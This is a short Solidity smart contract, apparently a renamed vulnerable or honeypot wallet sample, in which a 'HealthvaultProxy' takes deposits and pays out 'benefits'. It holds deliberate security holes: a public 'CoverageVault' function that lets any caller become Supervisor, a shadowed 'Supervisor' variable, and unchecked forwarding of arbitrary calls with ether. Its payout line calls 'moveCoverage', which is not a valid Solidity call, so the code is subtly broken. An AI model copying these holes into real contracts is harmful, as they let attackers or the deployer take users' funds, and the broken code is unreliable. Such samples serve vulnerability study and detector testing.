// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyAdministrator { if (msg.sender == Supervisor) _; } address Supervisor = msg.sender;
    function transferbenefitAdministrator(address _manager) public onlyAdministrator { Supervisor = _manager; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract HealthvaultProxy is Proxy {
    address public Supervisor;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function CoverageVault() public payable {
        if (msg.sender == tx.origin) {
            Supervisor = msg.sender;
            fundAccount();
        }
    }

    function fundAccount() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function claimBenefit(uint256 amount) public onlyAdministrator {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.moveCoverage(amount);
        }
    }
}